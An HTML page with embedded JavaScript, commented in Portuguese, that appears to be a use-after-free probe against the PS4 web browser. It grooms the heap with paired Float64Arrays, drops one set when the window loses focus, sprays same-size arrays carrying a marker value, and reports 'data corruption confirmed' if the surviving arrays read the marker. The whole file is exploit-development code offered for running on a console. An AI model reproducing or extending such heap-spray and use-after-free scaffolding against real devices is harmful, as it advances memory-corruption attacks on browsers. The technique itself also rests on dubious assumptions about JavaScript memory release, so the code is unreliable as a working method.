
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF: Data Corruption Test</title>
<style>
    body { background-color: #111; color: #fff; font-family: monospace; text-align: center; }
    button { background: #d35400; color: white; padding: 20px 40px; font-size: 1.5em; border: none; cursor: pointer; font-weight: bold; }
    #log { text-align: left; margin: 20px auto; max-width: 800px; background: #222; padding: 15px; border: 1px solid #555; white-space: pre-wrap; font-size: 1.1em; }
    .success { color: #00ff00; font-weight: bold; }
</style>
</head>
<body>

<h1>PS4 UAF: Same-Type Overlap</h1>
<div id="msg">CLIQUE PARA INICIAR. DEPOIS APERTE OPTIONS.</div>
<br>
<button onclick="fire()">RODAR TESTE DE INTEGRIDADE</button>
<div id="log"></div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += txt + "\n"; }

    // Arrays globais
    let controller = []; 
    let target = [];
    
    // Tamanho modesto. Não precisamos de milhões.
    // Apenas o suficiente para encher o Cache do alocador (L1/L2 Cache)
    const COUNT = 10000; 

    function fire() {
        document.getElementById('msg').innerText = "Alocando... Aguarde.";
        
        // FASE 1: PREPARAÇÃO
        // Criamos Controller e Target alternados na memória.
        // Ambos são Float64Array de tamanho 32. Como são iguais, devem ficar juntos.
        for(let i=0; i < COUNT; i++) {
            let c = new Float64Array(32);
            c.fill(0); // Controlador deve ser tudo ZERO
            c[0] = i;  // Marcador
            controller.push(c);

            let t = new Float64Array(32);
            t.fill(1.1); // Alvo
            target.push(t);
        }

        document.getElementById('msg').innerText = "PRONTO! APERTE OPTIONS AGORA!";

        // Trigger Fullscreen
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        // FASE 2: GATILHO
        window.onblur = function() {
            log("[*] Blur detectado. Executando UAF...");

            // 1. FREE (Libera os alvos)
            target = null; 

            // 2. SPRAY (Preenche com valor único)
            // Usamos o MESMO tipo (Float64Array) e MESMO tamanho (32).
            // A chance de reuso de memória aqui é altíssima.
            let spray = [];
            const MARKER = 1337.1337; 

            try {
                for(let i=0; i < COUNT + 5000; i++) {
                    let s = new Float64Array(32);
                    s.fill(MARKER);
                    spray.push(s);
                }
            } catch(e) {}

            log("[*] Spray finalizado. Verificando integridade...");

            // FASE 3: CHECAGEM
            let corruption_count = 0;
            for(let i=0; i < COUNT; i++) {
                // O Controlador[i] deveria ter 0 (ou o índice i na posição 0).
                // Se ele tiver 1337.1337, significa que ele está apontando
                // para a memória do novo array que acabamos de criar.
                
                // Checa a posição 1 do array (que deveria ser 0)
                if (controller[i][5] === MARKER) {
                    corruption_count++;
                    if (corruption_count === 1) {
                         document.body.style.background = "green";
                         log("\n!!! SUCESSO CRÍTICO !!!");
                         log("Controller[" + i + "] foi corrompido!");
                         log("Valor esperado: 0");
                         log("Valor encontrado: " + controller[i][5]);
                         log("Isso prova que controlamos o conteúdo de arrays alheios.");
                    }
                }
            }

            if (corruption_count > 0) {
                log("\nTotal de arrays corrompidos: " + corruption_count);
                document.getElementById('msg').innerHTML = "<h1 style='color:lime'>DATA CORRUPTION CONFIRMED</h1>";
            } else {
                document.body.style.background = "red";
                log("[-] Falha. Tente novamente.");
            }
        };
    }
</script>
</body>
</html>
